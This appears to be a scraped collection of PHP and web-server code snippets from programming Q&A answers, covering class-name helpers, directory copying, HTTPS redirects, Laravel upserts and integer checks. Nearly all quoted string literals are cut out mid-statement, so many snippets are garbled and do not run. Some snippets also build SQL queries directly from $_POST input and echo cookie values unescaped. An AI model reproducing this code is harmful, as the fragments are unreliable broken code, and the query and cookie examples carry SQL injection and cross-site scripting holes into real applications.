function get_ordinal($number) { $ends=array( $last_digit=substr($number, -1, 1); return $number.$ends[$last_digit]; }
function getOrdinal($n) { return $n . date_format(date_create( }
<?php function addOrdinalNumberSuffix($num) { if (!in_array(($num % 100),array(11,12,13))){ switch ($num % 10) { case 1: return $num. case 2: return $num. case 3: return $num. } } return $num. } ?>
$reflect = new ReflectionClass($object); if ($reflect->getShortName() === }
Reflection: 1.967512512207 s ClassA Basename: 2.6840535163879 s ClassA Explode: 2.6507515668869 s ClassA
namespace foo\bar\baz; class ClassA{ public function getClassExplode(){ $c = array_pop(explode( return $c; } public function getClassReflection(){ $c = (new \ReflectionClass($this))->getShortName(); return $c; } public function getClassBasename(){ $c = basename(str_replace( return $c; } } $a = new ClassA(); $num = 100000; $rounds = 10; $res = array( "Reflection" => array(), "Basename" => array(), "Explode" => array(), ); for($r = 0; $r < $rounds; $r++){ $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassReflection(); } $end = microtime(true); $res["Reflection"][] = ($end-$start); $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassBasename(); } $end = microtime(true); $res["Basename"][] = ($end-$start); $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassExplode(); } $end = microtime(true); $res["Explode"][] = ($end-$start); } echo "Reflection: ".array_sum($res["Reflection"])/count($res["Reflection"])." s ".$a->getClassReflection()."\n"; echo "Basename: ".array_sum($res["Basename"])/count($res["Basename"])." s ".$a->getClassBasename()."\n"; echo "Explode: ".array_sum($res["Explode"])/count($res["Explode"])." s ".$a->getClassExplode()."\n";
$classNameWithNamespace=get_class($this); return substr($classNameWithNamespace, strrpos($classNameWithNamespace,
Reflection: 0.068084406852722 s ClassA Basename: 0.12301609516144 s ClassA Explode: 0.14073524475098 s ClassA Substring: 0.059865570068359 s ClassA
namespace foo\bar\baz; class ClassA{ public function getClassExplode(){ $c = array_pop(explode( return $c; } public function getClassReflection(){ $c = (new \ReflectionClass($this))->getShortName(); return $c; } public function getClassBasename(){ $c = basename(str_replace( return $c; } public function getClassSubstring(){ $classNameWithNamespace = get_class($this); return substr($classNameWithNamespace, strrpos($classNameWithNamespace, } } $a = new ClassA(); $num = 100000; $rounds = 10; $res = array( "Reflection" => array(), "Basename" => array(), "Explode" => array(), "Substring" => array() ); for($r = 0; $r < $rounds; $r++){ $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassReflection(); } $end = microtime(true); $res["Reflection"][] = ($end-$start); $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassBasename(); } $end = microtime(true); $res["Basename"][] = ($end-$start); $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassExplode(); } $end = microtime(true); $res["Explode"][] = ($end-$start); $start = microtime(true); for($i = 0; $i < $num; $i++){ $a->getClassSubstring(); } $end = microtime(true); $res["Substring"][] = ($end-$start); } echo "Reflection: ".array_sum($res["Reflection"])/count($res["Reflection"])." s ".$a->getClassReflection()."\n"; echo "Basename: ".array_sum($res["Basename"])/count($res["Basename"])." s ".$a->getClassBasename()."\n"; echo "Explode: ".array_sum($res["Explode"])/count($res["Explode"])." s ".$a->getClassExplode()."\n"; echo "Substring: ".array_sum($res["Substring"])/count($res["Substring"])." s ".$a->getClassSubstring()."\n";
Reflection: 0.073065280914307 s ClassA Basename: 0.12585079669952 s ClassA Explode: 0.14593172073364 s ClassA Substring: 0.060415267944336 s ClassA SubstringStrChr: 0.059880912303925 s ClassA
<?php $name = class_basename( $name = class_basename(__CLASS__);
$bench = new \xori\Benchmark(1000, 1000); $shell = new \my\fancy\namespace\classname(); $bench->register( return substr(static::class, strrpos(static::class, })->bindTo($shell)); $bench->register( return substr(static::class, ($p = strrpos(static::class, })->bindTo($shell)); $bench->register( return substr(strrchr(static::class, })->bindTo($shell)); $bench->register( return (new \ReflectionClass($this))->getShortName(); })->bindTo($shell)); $bench->register( return $obj->getShortName(); })->bindTo($shell), new \ReflectionClass($shell)); $bench->register( return basename(str_replace( })->bindTo($shell)); $bench->register( $e = explode("\\", static::class); return end($e); })->bindTo($shell)); $bench->register( return join( })->bindTo($shell)); print_r($bench->start());
+-----------------+--------+ | registered name | speed | +-----------------+--------+ | reflection 2 | 70.75% | | strrpos | 60.38% | | safe strrpos | 57.69% | | strrchr | 54.88% | | explode | 46.60% | | slice | 37.02% | | reflection | 16.75% | | basename | 0.00% | +-----------------+--------+
namespace { trait Names { public static function getNamespace() { return implode( } public static function getBaseClassName() { return basename(str_replace( } } }
namespace x\y\z { class SomeClass { use \Names; } echo \x\y\z\SomeClass::getNamespace() . PHP_EOL; echo \x\y\z\SomeClass::getBaseClassName() . PHP_EOL; }
namespace d\e\f { class DifferentClass extends \x\y\z\SomeClass { } echo \d\e\f\DifferentClass::getNamespace() . PHP_EOL; echo \d\e\f\DifferentClass::getBaseClassName() . PHP_EOL; }
namespace { class ClassWithoutNamespace { use \Names; } echo ClassWithoutNamespace::getNamespace() . PHP_EOL; echo ClassWithoutNamespace::getBaseClassName() . PHP_EOL; }
\yii\helpers\StringHelper::basename(get_class($model));
$ex = explode("\\", get_class($object)); $className = end($ex);
$calledClass = get_called_class(); $name = strpos($calledClass, $calledClass : substr($calledClass, strrpos($calledClass,
<?php namespace One\Two { class foo { public function foo() { $calledClass = get_called_class(); $name = strpos($calledClass, $calledClass : substr($calledClass, strrpos($calledClass, var_dump($name); } } } namespace Three { class bar extends \One\Two\foo { public function bar() { $this->foo(); } } } namespace { (new One\Two\foo)->foo(); (new Three\bar)->bar(); }
trait ClassShortNameTrait { public static function getClassShortName() { if ($pos = strrchr(static::class, return substr($pos, 1); } else { return static::class; } } }
namespace Foo\Bar\Baz; class A { use ClassShortNameTrait; }
function get_class_name($object = null) { if (!is_object($object) && !is_string($object)) { return false; } $class = explode( return $class[count($class) - 1]; }
<?php namespace \My\Awesome\Namespace; class Foo { private $shortName; public function fastShortName() { if ($this->shortName === null) { $this->shortName = explode("\\", static::class); $this->shortName = end($this->shortName); } return $this->shortName; } public function shortName() { return basename(strtr(static::class, "\\", "/")); } } echo (new Foo())->shortName(); ?>
$arr = explode( foreach ($arr as $value) { $new_arr[] = trim($value); }
Array ( [0] => red [1] => green thing [2] => blue [3] => orange )
$str = " , Number1 , 234, 0 ,4heaven var_export(str_word_count($str,1,
$bar = preg_split ( print_r ($bar); /* Result: Array ( [0] => red [1] => green [2] => blue [3] => orange ) */
<?php function recurse_copy($src,$dst) { $dir = opendir($src); @mkdir($dst); while(false !== ( $file = readdir($dir)) ) { if (( $file != if ( is_dir($src . recurse_copy($src . } else { copy($src . } } } closedir($dir); } ?>
/** * Copy a file, or recursively copy a folder and its contents * @author Aidan Lister <aidan@php.net> * @version 1.0.1 * @link http: * @param string $source Source path * @param string $dest Destination path * @param int $permissions New folder creation permissions * @return bool Returns true on success, false on failure */ function xcopy($source, $dest, $permissions = 0755) { if (is_link($source)) { return symlink(readlink($source), $dest); } if (is_file($source)) { return copy($source, $dest); } if (!is_dir($dest)) { mkdir($dest, $permissions); } $dir = dir($source); while (false !== $entry = $dir->read()) { if ($entry == continue; } xcopy("$source/$entry", "$dest/$entry", $permissions); } $dir->close(); return true; }
function xcopy($src, $dest) { foreach (scandir($src) as $file) { if (!is_readable($src . if (is_dir($src . mkdir($dest . xcopy($src . } else { copy($src . } } }
<?php $src = "/home/www/domain-name.com/source/folders/123456"; $dest = "/home/www/domain-name.com/test/123456"; shell_exec("cp -r $src $dest"); echo "<H3>Copy Paste completed!</H3>"; ?>
function full_copy( $source, $target ) { if ( is_dir( $source ) ) { @mkdir( $target ); $d = dir( $source ); while ( FALSE !== ( $entry = $d->read() ) ) { if ( $entry == continue; } $Entry = $source . if ( is_dir( $Entry ) ) { full_copy( $Entry, $target . continue; } copy( $Entry, $target . } $d->close(); }else { copy( $source, $target ); } }
<?php function copy_directory( $source, $destination ) { if ( is_dir( $source ) ) { @mkdir( $destination ); $directory = dir( $source ); while ( FALSE !== ( $readdirectory = $directory->read() ) ) { if ( $readdirectory == continue; } $PathDir = $source . if ( is_dir( $PathDir ) ) { copy_directory( $PathDir, $destination . continue; } copy( $PathDir, $destination . } $directory->close(); }else { copy( $source, $destination ); } } ?>
function copyToDir($pattern, $dir) { foreach (glob($pattern) as $file) { if(!is_dir($file) && is_readable($file)) { $dest = realpath($dir . DIRECTORY_SEPARATOR) . basename($file); copy($file, $dest); } } } copyToDir(
function recurse_copy($src, $dst) { $dir = opendir($src); $result = ($dir === false ? false : true); if ($result !== false) { $result = @mkdir($dst); if ($result === true) { while(false !== ( $file = readdir($dir)) ) { if (( $file != if ( is_dir($src . $result = recurse_copy($src . } else { $result = copy($src . } } } closedir($dir); } } return $result; }
Helper::copy($sourcePath, $targetPath); class Helper { static function copy($source, $target) { if (!is_dir($source)) { copy($source, $target); return; } @mkdir($target); $d = dir($source); $navFolders = array( while (false !== ($fileEntry=$d->read() )) { if (in_array($fileEntry, $navFolders) ) { continue; } $s = "$source/$fileEntry"; $t = "$target/$fileEntry"; self::copy($s, $t); } $d->close(); } }
$fileSystem = new Symfony\Component\Filesystem\Filesystem(); $fileSystem->mirror($from, $to);
function recursiveCopy($source, $destination) { if (!file_exists($destination)) { mkdir($destination); } $splFileInfoArr = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); foreach ($splFileInfoArr as $fullPath => $splFileinfo) { if (in_array($splFileinfo->getBasename(), [".", ".."])) { continue; } $path = str_replace($source, "", $splFileinfo->getPathname()); if ($splFileinfo->isDir()) { mkdir($destination . "/" . $path); } else { copy($fullPath, $destination . "/" . $path); } } } recursiveCopy(__DIR__ . "/source", __DIR__ . "/destination");
function rCopy($directory, $destination) { $command = sprintf( exec($command); }
mkdir($dest); foreach ($iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($source, \RecursiveDirectoryIterator::SKIP_DOTS), \RecursiveIteratorIterator::SELF_FIRST) as $item) { if ($item->isDir()) mkdir($dest.DIRECTORY_SEPARATOR.$iterator->getSubPathName()); else copy($item, $dest.DIRECTORY_SEPARATOR.$iterator->getSubPathName()); }
$input = "A B C D"; $words = preg_split( var_dump($words);
$searchValues = preg_split("@[\s+ ]@u", $searchString);
function explode_whitespace($str) { $parts = preg_split( $sizeParts = sizeof($parts); if ($sizeParts > 0) { $lastPart = $parts[$sizeParts-1]; if ($lastPart == array_pop($parts); $sizeParts--; } if ($sizeParts > 0) { $firstPart = $parts[0]; if ($firstPart == array_shift($parts); } } return $parts; }
Explode string by one or more spaces or tabs in php example as follow: <?php $str = "test1 test2 test3 test4"; $result = preg_split( var_dump($result); ?> /** To seperate by spaces alone: **/ <?php $string = "p q r s t"; $res = preg_split( var_dump($res); ?>
$str = "A B C D"; $s = explode(" ",$str); foreach ($s as $a=>$b){ if ( trim($b) ) { print "using $b\n"; } }
public function run() { ... (1) $this->data = $data; ... (2) $this->other = someOperation($this->data); ... } (3) echo preg_match($pattern, $replace, $thread->data);
class MyThread extends Thread { public function run(){ } } $t = new MyThread(); if($t->start()){ while($t->isRunning()){ echo "."; usleep(100); } $t->join(); }
while ($process1->isRunning() && $process2->isRunning()) { sleep(1); } should of course be: while ($process1->isRunning() || $process2->isRunning()) { sleep(1); }
<?php $shopOwner = ShopMeta::where( ->where( if ($shopOwner == null) { } else { }
$user = User::firstOrNew(array( $user->foo = Input::get( $user->save();
/** * Create or update a record matching the attributes, and fill it with values. * * @param array $attributes * @param array $values * @return static */ public static function updateOrCreate(array $attributes, array $values = array()) { $instance = static::firstOrNew($attributes); $instance->fill($values)->save(); return $instance; }
public static function createOrUpdate($formatted_array) { $row = Model::find($formatted_array[ if ($row === null) { Model::create($formatted_array); Session::flash( } else { $row->update($formatted_array); Session::flash( } $affected_row = Model::find($formatted_array[ return $affected_row; }
$matchThese = array( ShopMeta::updateOrCreate($matchThese,[
if ($this->exists) { $saved = $this->performUpdate($query); } else { $saved = $this->performInsert($query); }
$object = MyModel::findOrNew($id); $object->save();
/** * If the register exists in the table, it updates it. * Otherwise it creates it * @param array $data Data to Insert/Update * @param array $keys Keys to check for in the table * @return Object */ static function createOrUpdate($data, $keys) { $record = self::where($keys)->first(); if (is_null($record)) { return self::create($data); } else { return self::where($keys)->update($data); } }
public static function createOrUpdate($data, $keys) { $record = self::where($keys)->first(); if (is_null($record)) { return self::create($data); } else { return $record->update($data); } }
$exist = DB::table( if(count($exist) >0) { echo "User already exist";; } else { $data=array( DB::table( } Laravel 5.4
<Location /buyCrap.php> RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https: </Location>
$use_sts = true; if ($use_sts && isset($_SERVER[ header( } elseif ($use_sts) { header( die(); }
RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https:
if($_SERVER["HTTPS"] != "on") { $pageURL = "Location: https: if ($_SERVER["SERVER_PORT"] != "80") { $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"]; } else { $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; } header($pageURL); }
function isSecure() { return ( (!empty($_SERVER[ || $_SERVER[ || ( (!empty($_SERVER[ || (!empty($_SERVER[ ) ); } function requireHTTPS() { if (!isSecure()) { header( exit; } }
RewriteEngine On RewriteCond %{SERVER_PORT} 80 RewriteRule ^(.*)$ https:
RewriteEngine On RewriteCond %{SERVER_PORT} 80 RewriteCond %{REQUEST_URI} somefolder RewriteRule ^(.*)$ https:
RewriteEngine On RewriteCond %{SERVER_PORT} 80 RewriteRule ^(.*)$ https:
if(empty($_SERVER["HTTPS"])){ } if(strstr($_SERVER[ }
RewriteCond %{HTTPS} =off [NC] RewriteCond %{HTTP_HOST} ^(?i:www+\.+[^.]+\.+[^.]+)$ RewriteRule ^(.*)$ https: RewriteCond %{HTTP_HOST} ^([^.]+\.+[^.]+)$ RewriteRule ^(.*)$ https:
if($_SERVER["HTTPS"] != "on") { header("Location: https: exit(); }
<httpProtocol> <customHeaders> <add name="Strict-Transport-Security" value="max-age=31536000"/> </customHeaders> </httpProtocol> <rewrite> <rules> <rule name="HTTP to HTTPS redirect" stopProcessing="true"> <match url="(.*)" /> <conditions> <add input="{HTTPS}" pattern="off" ignoreCase="true" /> </conditions> <action type="Redirect" redirectType="Found" url="https: </rule> </rules> </rewrite>
<?xml version="1.0" encoding="UTF-8"?> <configuration> <system.webServer> <httpProtocol> <customHeaders> <add name="Strict-Transport-Security" value="max-age=31536000"/> </customHeaders> </httpProtocol> <rewrite> <rules> <rule name="HTTP to HTTPS redirect" stopProcessing="true"> <match url="(.*)" /> <conditions> <add input="{HTTPS}" pattern="off" ignoreCase="true" /> </conditions> <action type="Redirect" redirectType="Found" url="https: </rule> </rules> </rewrite> </system.webServer> </configuration>
RewriteEngine On RewriteCond %{HTTPS} off RewriteRule ^(.*)$ https:
if (stripos(substr($_SERVER[SCRIPT_URI], 0, 5), "https") === false) { header("location:https: echo "<meta http-equiv= exit; }
$protocol = $_SERVER["HTTP_CF_VISITOR"]; if (!strstr($protocol, header("Location: https: exit(); }
$is_https=false; if (isset($_SERVER[ if ($is_https !== "on") { header("Location: https: exit(1); }
if(empty($_SERVER[ $redirect = enter code hereheader( header( exit(); }
<?php if ($_SERVER[ $url = "https: header("Location: $url"); exit; } ?>
static class Hello { private static $greeting = private __construct() { $greeting .= } public static greet(){ echo $greeting; } } Hello::greet();
<?php class Hello { private static $greeting = private static $initialized = false; private static function initialize() { if (self::$initialized) return; self::$greeting .= self::$initialized = true; } public static function greet() { self::initialize(); echo self::$greeting; } } Hello::greet(); ?>
<?php class Hello { /** * Construct won * the outside. This prevents instantiating this class. * This is by purpose, because we want a static class. */ private function __construct() {} private static $greeting = private static $initialized = false; private static function initialize() { if (self::$initialized) return; self::$greeting .= self::$initialized = true; } public static function greet() { self::initialize(); echo self::$greeting; } } Hello::greet(); ?>
final Class B{ static $staticVar; static function getA(){ self::$staticVar = New A; } }
Class a{ static $instance; static function getA(...){ if(!isset(self::$staticVar)){ self::$staticVar = New A(...); } return self::$staticVar; } }
class Factory { static function &getDB ($construct_params = null) { static $instance; if( ! is_object($instance) ) { include_once("clsDB.php"); $instance = new clsDB($construct_params); } return $instance; } }
class clsDB { $regular_public_variables = "whatever"; function __construct($construct_params) {...} function __destruct() {...} function getvar() { return $this->regular_public_variables; } }
final Class B{ static $var; static function init(){ self::$var = new A(); } B::init();
[04-Apr-2016 06:58:27] PHP Parse error: syntax error, unexpected
MAMP > bin > php > [your PHP version] > conf > php.ini
if($check) { echo "password is correct"; } else { echo "password is incorrect"; }
<?php $wp_hasher = new PasswordHash(8, TRUE); $password_hashed = $plain_password = if($wp_hasher->CheckPassword($plain_password, $password_hashed)) { echo "YES, Matched"; } else { echo "No, Wrong Password"; } ?>
<?php $c = new Criteria(); $c->add(ExamplePeer::ID, 20); $items = ExamplePeer::doSelectJoinFoobar($c); $items = Doctrine_Query::create() ->from( ->leftJoin( ->where( ->execute(); ?>
<script type="text/javascript"> function func_load3(name){ var oForm = document.forms["myform"]; var oSelectBox = oForm.select3; var iChoice = oSelectBox.selectedIndex; var sa = oSelectBox.options[iChoice].text; document.getElementById("hidden1").value = sa; } </script> <form name="myform" action="<?php echo $_SERVER[ <input type="hidden" name="hidden1" id="hidden1" /> </form> <?php $salarieid = $_POST[ $query = "select * from salarie where salarieid = ".$salarieid; echo $query; $result = mysql_query($query); ?> <table> code for display the query result. </table>
<DOCTYPE html> <html> <head> <title>My Test Form</title> </head> <body> <form method="POST"> <p>Please, choose the salary id to proceed result:</p> <p> <label for="salarieids">SalarieID:</label> <?php $query = "SELECT * FROM salarie"; $result = mysql_query($query); if ($result) : ?> <select id="salarieids" name="salarieid"> <?php while ($row = mysql_fetch_assoc($result)) { echo } ?> </select> <?php endif ?> </p> <p> <input type="submit" value="Sumbit my choice"/> </p> </form> <?php if isset($_POST[ <?php $query = "SELECT * FROM salarie WHERE salarieid = " . $_POST[ $result = mysql_query($query); if ($result) : ?> <table> <?php while ($row = mysql_fetch_assoc($result)) { echo echo echo } ?> </table> <?php endif?> <?php endif ?> </body> </html>
if (window.XMLHttpRequest){ xmlhttp=new XMLHttpRequest(); } else{ xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); } var PageToSendTo = "nowitworks.php?"; var MyVariable = "variableData"; var VariablePlaceholder = "variableName="; var UrlToSend = PageToSendTo + VariablePlaceholder + MyVariable; xmlhttp.open("GET", UrlToSend, false); xmlhttp.send();
$(document).ready(function () { createCookie("height", $(window).height(), "10"); }); function createCookie(name, value, days) { var expires; if (days) { var date = new Date(); date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)); expires = "; expires=" + date.toGMTString(); } else { expires = ""; } document.cookie = escape(name) + "=" + escape(value) + expires + "; path=/"; }
<script> var p1 = "success"; </script> <?php echo "<script>document.writeln(p1);</script>"; ?>
<?php if(isset($_POST)) { print_r($_POST); } ?> <form action="<?php echo $_SERVER[ <input type="text" name="data" value="1" /> <input type="submit" value="Submit" /> </form>
function statusChangeCallback(response) { console.log( if (response.status === FB.api( document.cookie = "fbdata = " + result.id + "," + result.first_name + "," + result.last_name + "," + result.email; console.log(document.cookie); }); } }
<?php if(isset($_COOKIE[ echo "welcome ".$_COOKIE[ } ?>
<?php ob_start(); ?> <script type="text/javascript"> var d = new Date(); document.write(d.getTimezoneOffset()); </script> <?php $offset = ob_get_clean(); print_r($offset);
<?php if (isset($_POST[ echo "You submitted {$_POST[ die; } echo <<<HTML <form name="myform" action="{$_SERVER[ <input type="submit" name="submit" value="Test this mess!" /> <input type="hidden" name="hidden1" id="hidden1" /> </form> <script type="text/javascript"> document.getElementById("hidden1").value = "This is an example"; </script> HTML; ?>
$ more multi.php <?php $a = array(1 => $b = array(1 => $c = array(1 => function is_multi($a) { $rv = array_filter($a, if(count($rv)>0) return true; return false; } function is_multi2($a) { foreach ($a as $v) { if (is_array($v)) return true; } return false; } function is_multi3($a) { $c = count($a); for ($i=0;$i<$c;$i++) { if (is_array($a[$i])) return true; } return false; } $iters = 500000; $time = microtime(true); for ($i = 0; $i < $iters; $i++) { is_multi($a); is_multi($b); is_multi($c); } $end = microtime(true); echo "is_multi took ".($end-$time)." seconds in $iters times\n"; $time = microtime(true); for ($i = 0; $i < $iters; $i++) { is_multi2($a); is_multi2($b); is_multi2($c); } $end = microtime(true); echo "is_multi2 took ".($end-$time)." seconds in $iters times\n"; $time = microtime(true); for ($i = 0; $i < $iters; $i++) { is_multi3($a); is_multi3($b); is_multi3($c); } $end = microtime(true); echo "is_multi3 took ".($end-$time)." seconds in $iters times\n"; ?> $ php multi.php is_multi took 7.53565130424 seconds in 500000 times is_multi2 took 4.56964588165 seconds in 500000 times is_multi3 took 9.01706600189 seconds in 500000 times
$ more multi.php <?php $a = array(1 => $b = array(1 => function is_multi($a) { $rv = array_filter($a, if(count($rv)>0) return true; return false; } var_dump(is_multi($a)); var_dump(is_multi($b)); ?> $ php multi.php bool(true) bool(false)
if (count($array) == count($array, COUNT_RECURSIVE)) { echo } else { echo }
function is_multi($array) { return (count($array) != count($array, 1)); }
if (count($myarray) !== count($myarray, COUNT_RECURSIVE)) return true; else return false;
function is_multidimensional(array $array) { return count($array) !== count($array, COUNT_RECURSIVE); }
function isMultiArray($a){ foreach($a as $v) if(is_array($v)) return TRUE; return FALSE; }
function countdim($array) { if (is_array(reset($array))) $return = countdim(reset($array)) + 1; else $return = 1; return $return; }
function isMultiArray($a){ foreach($a as $v) if(is_array($v)) return TRUE; return FALSE; }
$a = array(1 => $b = array(1 => echo isMultiArray($a) ? echo echo isMultiArray($b) ?
$array = array( $array1 = array( function is_multi_dimensional($array){ $flag = 0; while(list($k,$value)=each($array)){ if(is_array($value)) $flag = 1; } return $flag; } echo is_multi_dimensional($array); echo is_multi_dimensional($array1);
if (count($arrayList) != count($arrayList, COUNT_RECURSIVE)) { echo }else{ echo }
static public function isMulti($array) { $result = array_unique(array_map("gettype",$array)); return count($result) == 1 && array_shift($result) == "array"; }
function is_multi_array($array=[],$mode= $result = false; if(is_array($array)){ if($mode== if(is_array(array_shift($array))){ $result = true; } } elseif($mode== $result = true; foreach($array as $key => $value){ if(!is_array($value)){ $result = false; break; } } } elseif($mode== if(count($array)!==count($array, COUNT_RECURSIVE)){ $result = true; } } } return $result; }
function is_multi_array( $arr ) { rsort( $arr ); return isset( $arr[0] ) && is_array( $arr[0] ); } var_dump( is_multi_array( $some_array ) );
function is_multi($a) { foreach ($a as $v) { if (is_array($v)) { return "has array"; break; } break; } return }
substr_count(print_r([...array...], true), $a = array(1 => $b = array(1 => $c = array(1 => $d = array(array()); $e = array(1, array()); $f = array(array(), array()); $g = array("hello", "hi" => "hi there"); $h[] = $g; var_dump(substr_count(print_r($a, true), ...
function isMultiArray(array $value) { return is_array(reset($value)); }
if (strtoupper(substr(PHP_OS, 0, 3)) === echo } else { echo }
if (DIRECTORY_SEPARATOR == } if (DIRECTORY_SEPARATOR == }
<?php echo $_SERVER[ $browser = get_browser(null, true); print_r($browser); ?>
<?php class System { const OS_UNKNOWN = 1; const OS_WIN = 2; const OS_LINUX = 3; const OS_OSX = 4; /** * @return int */ static public function getOS() { switch (true) { case stristr(PHP_OS, case stristr(PHP_OS, case stristr(PHP_OS, default : return self::OS_UNKNOWN; } } }
if (stripos(PHP_OS, } elseif (stripos(PHP_OS, } elseif (stripos(PHP_OS, }
function isWin(){ if (strtolower(substr(PHP_OS, 0, 3)) === return true; } else { return false; } }
<?php echo foreach ($_SERVER as $k => $v){ echo "<tr><td>" . $k ."</td><td>" . $v . "</td></tr>"; } echo "</table>" ?>
<?php class Foo { function myFoo() { return "Foo"; } } class Bar extends Foo { function myFoo() { return "Bar"; } } $foo = new Foo; $bar = new Bar; echo($foo->myFoo()); echo($bar->myFoo()); ?>
class Addition { function compute($first, $second) { return $first+$second; } function compute($first, $second, $third) { return $first+$second+$third; } }
class Addition { function compute($first, $second, $third = 0) { return $first+$second+$third; } }
class Substraction extends Addition { function compute($first, $second, $third = 0) { return $first-$second-$third; } }
int a=1; String s="1"; bool a=true; something a=doSomething();
function hello($a){ print_r(func_get_args()); } function hello($a,$a){ print_r(func_get_args()); } hello( hello(
function a(){ alert( } a=function(){ alert( } a(); var a={ "a":function(){ alert( } } a.a=function(){ alert( } a.a();
class overload { public $name; public function __construct($agr) { $this->name = $agr; } public function __call($methodname, $agrument) { if($methodname == if(count($agrument) == 2) { $this->sum($agrument[0], $agrument[1]); } if(count($agrument) == 3) { echo $this->sum1($agrument[0], $agrument[1], $agrument[2]); } } } public function sum($a, $b) { return $a + $b; } public function sum1($a,$b,$c) { return $a + $b + $c; } } $object = new overload( echo $object->sum2(1,2,3);
class Shape { const Pi = 3.142 ; function __call($functionname, $argument){ if($functionname == switch(count($argument)){ case 0 : return 0 ; case 1 : return self::Pi * $argument[0] ; case 2 : return $argument[0] * $argument[1]; } } } $circle = new Shape();`enter code here` echo "Area of circle:".$circle->area()."</br>"; echo "Area of circle:".$circle->area(5)."</br>"; $rect = new Shape(); echo "Area of rectangle:".$rect->area(5,10);
class parent_class { public function text() { echo "Hello!! everyone I am parent class text method"."</br>"; } public function test() { echo "Hello!! I am second method of parent class"."</br>"; } } class child extends parent_class { public function text() class { echo "Hello!! Everyone i am child class"; } } $obj= new parent_class(); $obj->text(); $obj= new parent_class(); $obj->test(); $obj= new child(); $obj->text();
echo str_replace("11223344", "", "REGISTER 11223344 here");
$subject = $search = $trimmed = str_replace($search, echo $trimmed ;
$string="REGISTER 11223344 here"; $s = explode(" ",$string); unset($s[1]); $s = implode(" ",$s); print "$s\n";
$string = "REGISTER 11223344 here"; preg_match("/(\d+)/", $string, $match); $number = $match[1];
$string = "REGISTER 11223344 here"; preg_match("/REGISTER (\d+) here/", $string, $match); $number = $match[1];
/* * Remove index/indexes from a string, delimited by a space (or something else). * First, divides the string by delimiter and holds divided parts as an array. * If $index is an array, it removes all indexes of the divided string; * otherwise (i.e. has an int value), it removes just that index of the string. * At last, it joins all string parts together and return it as a string. * Note: If you want to use this function in PHP5, remove scalar type hints * (i.e. keywords before function arguments). * Note: For PHP versions lower than 7.0, remove scalar type hints (i.e. the * types before each argument) and the return type. */ function remove_from_str(string $str, $index, string $delimiter = " "): string { $strParts = explode($delimiter, $str); if (is_array($index)) foreach ($index as $i) $strParts[(int)$i] = null; else $strParts[(int)$index] = null; $strParts = array_filter($strParts); return implode($delimiter, $strParts); }
function str_substract($remove, $subject){ $strpos = strpos($subject, $remove); return substr($subject, 0, $strpos) . substr($subject, $strpos + strlen($remove)); } $str = "Hello, world. This is amazing"; print str_substract( "Hello, wo. This is amazing"
function coalesce() { $args = func_get_args(); foreach ($args as $arg) { if (!empty($arg)) { return $arg; } } return NULL; }
function coalesce() { return array_shift(array_filter(func_get_args())); }
$testData = array( , , , , , , ); foreach ( $testData as $key => $var ) { echo "$key " . (( empty( $var ) ) ? echo "$key " . (( is_null( $var ) ) ? echo }
function not_null($i){ return !is_null($i); } function coalesce(){ return array_shift(array_filter(func_get_args(), }
function coalesce() { $args = func_get_args(); foreach ($args as $arg) { if (!empty($arg)) { return $arg; } } return $args[0]; }
function coalesce() { return array_shift(array_filter(func_get_args(), function ($value) { return !is_null($value); })); }
[OPcache] zend_extension="/Applications/MAMP/bin/php/php5.5.3/lib/php/extensions/no-debug-non-zts-20121212/opcache.so" opcache.memory_consumption=128 opcache.interned_strings_buffer=8 opcache.max_accelerated_files=4000 opcache.revalidate_freq=60 opcache.fast_shutdown=1 opcache.enable_cli=1 enable=0
[OPcache] zend_extension="/Applications/MAMP/bin/php/php5.5.3/lib/php/extensions/no-debug-non-zts-20121212/opcache.so" opcache.memory_consumption=128 opcache.interned_strings_buffer=8 opcache.max_accelerated_files=4000 opcache.revalidate_freq=0 opcache.fast_shutdown=1 opcache.enable_cli=1
;[OPcache] ;zend_extension="/Applications/MAMP/bin/php/php5.5.3/lib/php/extensions/no-debug-non-zts-20121212/opcache.so" ;opcache.memory_consumption=128 ;opcache.interned_strings_buffer=8 ;opcache.max_accelerated_files=4000 ;opcache.revalidate_freq=60 ;opcache.fast_shutdown=1 ;opcache.enable_cli=1
<?php $strings = array( foreach ($strings as $testcase) { if (ctype_digit($testcase)) { echo "The string $testcase consists of all digits.\n"; } else { echo "The string $testcase does not consist of all digits.\n"; } } ?>
$numeric_string = $integer = 42; ctype_digit($numeric_string); ctype_digit($integer);
function my_is_int($input) { if ($input[0] == return ctype_digit(substr($input, 1)); } return ctype_digit($input); }
var_dump(filter_var( var_dump(filter_var( var_dump(filter_var(
var_dump(filter_var(2, FILTER_VALIDATE_INT)); var_dump(filter_var(2.0, FILTER_VALIDATE_INT)); var_dump(filter_var(2.1, FILTER_VALIDATE_INT));
function validatesAsInt($number) { $number = filter_var($number, FILTER_VALIDATE_INT); return ($number !== FALSE); }
$inty = "2"; $inty2 = " 2"; $floaty = "2.1"; $floaty2 = "2.0"; is_int($inty + 0); is_int($floaty + 0); is_int($floaty2 + 0); is_int($inty2 + 0); ctype_digit($inty2);
function my_is_int($var) { $tmp = (int) $var; if($tmp == $var) return true; else return false; }
/** * Check if a number is a counting number by checking if it * is an integer primitive type, or if the string represents * an integer as a string */ function is_int_val($data) { if (is_int($data) === true) return true; if (is_string($data) === true && is_numeric($data) === true) { return (strpos($data, } }
function my_is_int($s) { return (is_numeric($s) ? intval($s) == $s : false); }
my_is_int(2); my_is_int("2"); my_is_int(2.1); my_is_int("2.1"); my_is_int("dog"); my_is_int("2dog"); my_is_int("dog2"); my_is_int(array( my_is_int(array(1));
function isInt($val){ return (filter_var($val, FILTER_VALIDATE_INT) !== false && strpos($val, } var_dump (isInt("1"));
